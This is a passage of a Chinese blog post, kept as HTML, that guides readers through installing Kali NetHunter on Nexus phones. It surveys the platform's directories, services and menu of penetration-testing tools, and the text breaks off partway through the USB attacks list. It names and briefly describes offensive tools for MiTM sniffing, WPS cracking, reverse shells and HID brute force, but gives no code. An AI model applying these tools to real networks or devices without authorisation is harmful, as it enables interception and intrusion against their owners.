@@ -1,0 +1,975 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Pocket Hacking  NetHunter实战指南 | Blog of Secer</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="0x00 前言    许多朋友都希望Hacking套件可以很方便的从PC移植到更便携的手机或平板电脑上,而Offensive Security团队发布的Kali NetHunter则将这一期待变为现实,通过移动终端随时随地进行Hacking,暂且美其名曰口袋Hacking.  Kali NetHunter是以Nexus(手机/平板)为基本硬件设备(新增对1+手机的支持),基于原生Android">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pocket Hacking  NetHunter实战指南">
+<meta property="og:url" content="http://id.cker.in/1103.seo/index.html">
+<meta property="og:site_name" content="Blog of Secer">
+<meta property="og:description" content="0x00 前言    许多朋友都希望Hacking套件可以很方便的从PC移植到更便携的手机或平板电脑上,而Offensive Security团队发布的Kali NetHunter则将这一期待变为现实,通过移动终端随时随地进行Hacking,暂且美其名曰口袋Hacking.  Kali NetHunter是以Nexus(手机/平板)为基本硬件设备(新增对1+手机的支持),基于原生Android">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00113_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00213_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00313_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00412_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00115_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00215_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00315_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00414_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00511_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00611_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00711_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00811_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00911_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01011_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00117_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00217_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00317_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00416_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00513_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00613_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00713_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00813_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image009_thumb.jpg">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00119_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00219_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00319_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00418_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00515_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00615_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00715_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00815_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00913_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01013_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01111_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01211_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01311_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01410_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01510_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01610_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image0179_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image018_thumb.jpg">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image019_thumb.jpg">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image020_thumb.jpg">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image0217_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00121_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image002_thumb.jpg">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00321_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00420_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00517_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00617_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00717_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00817_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00915_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01015_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01113_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image012_thumb.jpg">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01313_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01412_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image015_thumb.jpg">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image016_thumb.jpg">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01711_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image0187_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image0197_thumb.png">
+<meta property="og:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image0207_thumb.png">
+<meta property="og:updated_time" content="2016-08-17T15:07:37.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Pocket Hacking  NetHunter实战指南">
+<meta name="twitter:description" content="0x00 前言    许多朋友都希望Hacking套件可以很方便的从PC移植到更便携的手机或平板电脑上,而Offensive Security团队发布的Kali NetHunter则将这一期待变为现实,通过移动终端随时随地进行Hacking,暂且美其名曰口袋Hacking.  Kali NetHunter是以Nexus(手机/平板)为基本硬件设备(新增对1+手机的支持),基于原生Android">
+<meta name="twitter:image" content="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00113_thumb.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Blog of Secer" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Blog of Secer</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Søk"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://id.cker.in"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-1103" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/1103.seo/" class="article-date">
+  <time datetime="2015-01-24T11:50:07.000Z" itemprop="datePublished">2015-01-24</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/category/N900-IPhone-Android/">N900-IPhone-Android</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Pocket Hacking  NetHunter实战指南
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p></p>  <h3>0x00 前言</h3>  <hr align="left" size="5" width="100%" noshade="noshade">  <p>许多朋友都希望Hacking套件可以很方便的从PC移植到更便携的手机或平板电脑上,而Offensive Security团队发布的Kali NetHunter则将这一期待变为现实,通过移动终端随时随地进行Hacking,暂且美其名曰口袋Hacking.</p>  <p><a href="http://ha.cker.in/tag/kali" target="_blank">Kali</a> <a href="http://ha.cker.in/tag/NetHunter" target="_blank">NetHunter</a>是以Nexus(手机/平板)为基本硬件设备(新增对1+手机的支持),基于原生Android实现的便携渗透测试平台.熟悉的Kali使其易于上手,而图形化控制界面则使某些测试更易.基于此平台,工程师们也可自由发挥,加入个人项目.</p>  <p>关于NetHunter国内外文章相对较少且重复度高,故在此将其主要实战技巧加以整理介绍,以备各位爱好者参考.由于资料不足,难免出错之处,如有疏漏错误,望不吝赐教.</p>  <h3>0x01 硬件支持</h3>  <hr align="left" size="5" width="100%" noshade="noshade">  <p>NetHunter官网给出以下支持刷入NetHunter的手机:</p>  <pre><code>Nexus 4 (GSM) - &quot;mako&quot;</code></pre><br><br><pre><code>Nexus 5 (GSM/LTE) - &quot;hammerhead&quot;</code></pre><br><br><pre><code>Nexus 7 [2012] (Wi-Fi) - &quot;nakasi&quot;</code></pre><br><br><pre><code>Nexus 7 [2012] (Mobile) - &quot;nakasig&quot;</code></pre><br><br><pre><code>Nexus 7 [2013] (Wi-Fi) - &quot;razor&quot;</code></pre><br><br><pre><code>Nexus 7 [2013] (Mobile) - &quot;razorg&quot;</code></pre><br><br><pre><code>Nexus 10 (Tablet) - &quot;mantaray&quot;</code></pre><br><br><pre><code>OnePlus One 16 GB - &quot;bacon&quot;</code></pre><br><br><pre><code>OnePlus One 64 GB - &quot;bacon&quot;</code></pre><br><br><p>值得一提的是,2015年NetHunter更新,由于1+手机的廉价与高性能,其被加入支持列表.用1+手机的朋友有福了,以下刷机以Nexus5为例.</p>
+
+<h3>0x02 刷机流程</h3>
+
+<hr align="left" size="5" width="100%" noshade="noshade">
+
+<p>官网给出几种刷机方式,推荐使用Windows引导刷机程序安装.下载地址:</p>
+
+<p><a href="https://www.kali.org/offsec-nethunter-installer/Kali_v1.1.6.sfx.exe" target="_blank" rel="external">https://www.kali.org/offsec-nethunter-installer/Kali_v1.1.6.sfx.exe</a></p>
+
+<p>打开安装引导程序,默认路径安装</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00113.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001[13]" border="0" alt="clip_image001[13]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00113_thumb.png" width="1066" height="802"></a></p>
+
+<p>安装后自动运行NetHunter Installer并更新,进入引导安装步骤</p>
+
+<p>· Step1,选择已有硬件设备型号.</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00213.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002[13]" border="0" alt="clip_image002[13]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00213_thumb.png" width="934" height="570"></a></p>
+
+<p>· Step2,安装驱动</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00313.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003[13]" border="0" alt="clip_image003[13]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00313_thumb.png" width="930" height="568"></a></p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00412.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004[12]" border="0" alt="clip_image004[12]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00412_thumb.png" width="1448" height="778"></a></p>
+
+<p>可以通过Test Drivers测试是否安装成功</p>
+
+<p>· Step3,安装选项</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00115.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001[15]" border="0" alt="clip_image001[15]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00115_thumb.png" width="930" height="576"></a></p>
+
+<p>如已经通过官网下载过刷机包,通过Browser选择文件.下载链接 <a href="http://www.offensive-security.com/kali-linux-nethunter-download/" target="_blank" rel="external">http://www.offensive-security.com/kali-linux-nethunter-download/</a> 下载后记得校验SHA1值.至于Android Flash Setting,因为对Android L的支持还未完成,故尚未开放选择.</p>
+
+<p>· Step4,下载文件</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00215.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002[15]" border="0" alt="clip_image002[15]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00215_thumb.png" width="928" height="576"></a></p>
+
+<p>如图示,下载所有依赖文件.</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00315.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003[15]" border="0" alt="clip_image003[15]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00315_thumb.png" width="1382" height="816"></a></p>
+
+<p>所有依赖包都为Ready可进入下一步刷机.</p>
+
+<p>· Step5,解锁设备</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00414.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004[14]" border="0" alt="clip_image004[14]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00414_thumb.png" width="930" height="576"></a></p>
+
+<p>解锁bootloader,注意需设置允许USB调试,手机会重启解锁.</p><br><a id="more"></a><br><p></p>
+
+<p>· Step6,重置原Android</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00511.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image005[11]" border="0" alt="clip_image005[11]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00511_thumb.png" width="928" height="574"></a></p>
+
+<p>同样再手机上勾选允许USB调试,注意数据会清空,记得备份.</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00611.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image006[11]" border="0" alt="clip_image006[11]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00611_thumb.png" width="1082" height="994"></a></p>
+
+<p>· Step7,刷入NetHunter</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00711.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image007[11]" border="0" alt="clip_image007[11]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00711_thumb.png" width="926" height="574"></a></p>
+
+<p>经过上一步重置手机后,需重新开启开发者模式,此时可刷入Kali Linux镜像并对手机进行Root,所需时间相对较长.(注:如镜像推送不成功,可以手工将kali_linux_nethunter_1.10_hammerhead_kitkat.zip复制到/sdcard/download/目录进行INSTALL)</p>
+
+<p>· Final,安装成功</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00811.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image008[11]" border="0" alt="clip_image008[11]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00811_thumb.png" width="928" height="580"></a></p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00911.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image009[11]" border="0" alt="clip_image009[11]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00911_thumb.png" width="1084" height="1924"></a></p>
+
+<h3>0x03 推荐APP一览</h3>
+
+<hr align="left" size="5" width="100%" noshade="noshade">
+
+<p>完成系统刷入后,要丰富NetHunter原装工具,可以下载部分安卓APP以配合.以下为个人推荐</p>
+
+<p>· 中文输入法:作为一个汉语狗还是必备的</p>
+
+<p>· 文件管理器(如RootExplorer):Kali某些文件需要通过支持Root权限的文件管理器.</p>
+
+<p>· ShadowSocks:梯子还是要有的</p>
+
+<p><a href="https://github.com/shadowsocks/shadowsocks-android/releases/download/v2.6.2/shadowsocks-nightly-2.6.2.apk" target="_blank" rel="external">https://github.com/shadowsocks/shadowsocks-android/releases/download/v2.6.2/shadowsocks-nightly-2.6.2.apk</a></p>
+
+<p>· MiTM工具:</p>
+
+<pre><code>·&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </code><code>zANTI2:</code><code>虽为商业化限制部分功能</code><code>,</code><code>但使用体验的确好些</code><code>.</code></pre>
+
+<pre><code>·&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </code><code>dSploit:</code><code>曾经很出名</code><code></code></pre>
+
+<pre><code>·&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </code><code>lanmitm:</code><code>国内安全工作者编写发布的工具</code><code></code></pre>
+
+<pre><code>·&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </code><code>Intercepter-NG:</code><code>嗅探工具</code><code> </code></pre>
+
+<pre><code>·&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </code><code>Network Spoofer:</code><code>自带许多调戏功能</code><code></code></pre>
+
+<p>· IPTools:部分常见基本网络工具集合</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01011.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image010[11]" border="0" alt="clip_image010[11]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image01011_thumb.png" width="1084" height="1924"></a></p>
+
+<p>· ChangeHostname:修改当前手机主机名HostName(还是有必要的).</p>
+
+<p>· WiGLE wifi:War Driving工具,收集无线热点信息,可保存到本地数据库.</p>
+
+<p>· SQLiteEditor:方便读取数据库信息</p>
+
+<p>· Hacker’s KeyBoard:NetHunter自带,便于输入各种控制字符</p>
+
+<p>· 远程桌面:NetHunter自带,便于连接VNC服务.</p>
+
+<p>· DriveDroid:NetHunter自带,将手机内镜像模拟为启动盘.</p>
+
+<h3>0x04 目录与服务</h3>
+
+<hr align="left" size="5" width="100%" noshade="noshade">
+
+<p>安装好NetHunter,先要对其目录与服务研究一番.Kali </p>
+
+<p>NetHunter根目录对应安卓系统目录的/data/local/kali-armhf目录</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00117.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001[17]" border="0" alt="clip_image001[17]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00117_thumb.png" width="1084" height="1924"></a></p>
+
+<p>NetHunter自带工具,也多在此目录内.故如有抓包/日志等文件,找不到存放地址,不妨到此目录下寻觅一番(注:需Root权限).另外,NetHunter某些工具运行时的提示的目录,也多以此处为根目录.</p>
+
+<p>通常,截获的数据包等文件存放在NetHunter目录下的Captures目录:</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00217.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002[17]" border="0" alt="clip_image002[17]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00217_thumb.png" width="1084" height="1924"></a></p>
+
+<p>与Kali Linux类似,/usr/share下存放了大部分工具,并建立link,命令行可直接调用.</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00317.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image003[17]" border="0" alt="clip_image003[17]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00317_thumb.png" width="1084" height="1924"></a></p>
+
+<p>而Metasploit则依然位于/opt/目录下.</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00416.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004[16]" border="0" alt="clip_image004[16]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00416_thumb.png" width="1084" height="1924"></a></p>
+
+<p>上图中/opt/dic目录则存放有字典文件,可自行补充.</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00513.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image005[13]" border="0" alt="clip_image005[13]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00513_thumb.png" width="1084" height="1924"></a></p>
+
+<p>此为/var/www目录,想来大家也知道是何用处了:)</p>
+
+<p>至于服务,Offensive Security团队在新版中加入NetHunter Home以APP的形式管理服务开关,避免了之前版本通过WebServer管理的弊端(比如Web页面调用Google Fonts被墙卡半天 ;)</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00613.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image006[13]" border="0" alt="clip_image006[13]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00613_thumb.png" width="1084" height="1924"></a></p>
+
+<p>如图示,NetHunter Home为主页面,除了Offensive Security的Banner,还可以获取当前IP(内网/外网)地址.</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00713.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image007[13]" border="0" alt="clip_image007[13]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00713_thumb.png" width="1084" height="1924"></a></p>
+
+<p>Kali Launcher整合了四个启动器:</p>
+
+<p>· 终端打开一个Kali Shell</p>
+
+<p>· 终端打开Kali NetHunter Menu</p>
+
+<p>· 终端打开Wifite进入无线破解</p>
+
+<p>· 更新Kali NetHunter(执行sudo -c bootkali update)</p>
+
+<p>对于NetHunter服务开关控制,则在Kali Service Control面板里进行设置</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00813.png" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image008[13]" border="0" alt="clip_image008[13]" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image00813_thumb.png" width="1084" height="1924"></a></p>
+
+<p>可看到,NetHunter可开放服务有SSH,Dnsmasq,Hostapd,OpenVPN,Apache,Metasploit及BeEF FrameWork等.</p>
+
+<p>· SSH服务:Secure Shell,方便其他设备连接控制.</p>
+
+<p>· Dnsmasq服务:DNS解析服务.</p>
+
+<p>· Hostapd服务:提供无线接入点服务.</p>
+
+<p>· OpenVPN服务:开放OpenVPN连入服务.</p>
+
+<p>· Apache服务:WEB服务.</p>
+
+<p>· Metasploit服务:为MSF攻击模块提供保障.</p>
+
+<p>· BeEF FrameWork服务:XSS利用框架服务.</p>
+
+<p>在此面板可对对应服务进行开关设置.</p>
+
+<h3>0x05 Kali NetHunter Menu</h3>
+
+<hr align="left" size="5" width="100%" noshade="noshade">
+
+<p>在NetHunter Launcher中Kali Menu的启动项,其包含整理有NetHunter常用工具,如图:</p>
+
+<p><a href="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image009.jpg" rel="external" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image009" border="0" alt="clip_image009" src="http://img.cker.in/PocketHackingNetHunter_34D7/clip_image009_thumb.jpg" width="964" height="544"></a></p>
+
+<p>与上一个版本相比，新增了以下选项:</p>
+
+<pre><code>USB Attacks</code></pre>
+
+<pre><code>NFC Attacks</code></pre>
+
+<pre><code>Monitor Mode</code></pre>
+
+<pre><code>Eject USB Wifi</code></pre>
+
+<p>主要模块及介绍如下:</p>
+
+<p><strong>Wireless Attacks</strong></p>
+
+<p>· Wifite</p>
+
+<p>自动无线安全审计工具</p>
+
+<p>· Kismet</p>
+
+<p>无线<a href="http://ha.cker.in/tag/WarDriving" target="_blank">WarDriving</a>工具</p>
+
+<p>· AP F**ker</p>
+
+<p>无线网恶意攻击工具(多为拒绝服务)</p>
+
+<p>· Wash</p>
+
+<p>扫描开启WPS的无线网络</p>
+
+<p>· Airodump-ng</p>
+
+<p>基本无线攻击套件(必备)</p>
+
+<p>· Pingen</p>
+
+<p>针对某些开启WPS的D-link的路由器计算其PIN码以破解</p>
+
+<p><strong>Sniffing/Spoofing</strong></p>
+
+<p>· tcpdump</p>
+
+<p>基本流量Dump工具</p>
+
+<p>· tshark</p>
+
+<p>WireShark的Cli工具,可抓取分析流量</p>
+
+<p>· urlsnarf</p>
+
+<p>Dsniff工具包一部分,可嗅探HTTP请求包内容，并以CLF通用日志格式输出</p>
+
+<p>· dsniff</p>
+
+<p>强大的知名口令嗅探工具包</p>
+
+<p>· MITMproxy</p>
+
+<p>中间代理,可截获修改HTTP流量,参考官网介绍</p>
+
+<p><strong>Reverse Shells</strong></p>
+
+<p>· AutoSSH</p>
+
+<p>通过SSH反弹shell(NAT Bypass)</p>
+
+<p>· pTunnel</p>
+
+<p>通过ICMP数据包隧道传送数据</p>
+
+<p><strong>Info Gathering</strong></p>
+
+<p>· Spiderfoot</p>
+
+<p>开源扫描与信息收集工具,对给定域名收集子域,Email地址,web服务器版本等信息,自动化扫描.</p>
+
+<p>· Recon-ng</p>
+
+<p>强大的信息收集工具,模块化,可惜许多插件国内不适用(有墙).</p>
+
+<p>· Device-pharmer</p>
+
+<p>通过Shodan搜索,大数据Hacking.</p>
+
+<p><strong>Vulnerability Scan</strong></p>
+
+<p>· OpenVas</p>
+
+<p>漏洞扫描器,需额外安装.Kali一直默认包含,好不好用客官自行定夺. :)</p>
+
+<p><strong>Exploit Tools</strong></p>
+
+<p>· Metasploit</p>
+
+<p>强大,核心,必备</p>
+
+<p>· BeEF-XSS</p>
+
+<p>XSS渗透测试工具,看个人习惯使用</p>
+
+<p>· Social-Engineering-Toolkit</p>
+
+<p>Kali下的SET,社会工程学套件,功能强大.</p>
+
+<p>· MITMf</p>
+
+<p>中间人攻击框架,基于Python,拥有多个插件,渗透测试功能强大</p>
+
+<p><strong>OpenVPN Setup</strong></p>
+
+<p>OpenVPN设置</p>
+
+<p><strong>VNC Setup</strong></p>
+
+<p>VNC设置</p>
+
+<p><strong>Log/Capture Menu</strong></p>
+
+<p>可擦除本地所有抓取数据或同步到SD</p>
+
+<p>卡上(同步主要是解决权限问题.比如多数安卓APP未获得root权限是无法读取NetHunter工具截获的数据内容)</p>
+
+<p><strong>USB Attacks</strong></p>
+
+<p>· Dictionary based brute force attack</p>
+
+<p>自动输入字典一行内容并回车,基于HID,模拟操作方式的暴力破解</p>
+
+<p>· deADBolt</p>
+
